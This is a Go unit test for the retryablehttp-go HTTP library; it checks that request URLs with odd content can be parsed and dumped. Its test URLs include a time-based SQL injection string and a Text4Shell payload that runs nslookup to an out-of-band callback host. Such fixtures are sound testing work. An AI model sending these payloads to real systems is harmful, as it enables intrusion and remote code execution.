package retryablehttp_test

import (
	"os"
	"testing"

	"github.com/projectdiscovery/retryablehttp-go"
)

func TestRequestUrls(t *testing.T) {
	testcases := []string{
		"https://scanme.sh?exploit=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(12)))nQIP)",
		"https://scanme.sh/%20test%0a",
		"https://scanme.sh/text4shell/attack?search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d",
	}

	debug := os.Getenv("DEBUG")

	for _, v := range testcases {
		req, err := retryablehttp.NewRequest("GET", v, nil)
		if err != nil {
			t.Errorf(err.Error())
			continue
		}
		bin, err := req.Dump()
		if err != nil {
			t.Errorf("failed to dump request body %v", err)
		}
		if debug != "" {
			t.Logf("\n%v\n", string(bin))
		}
	}
}
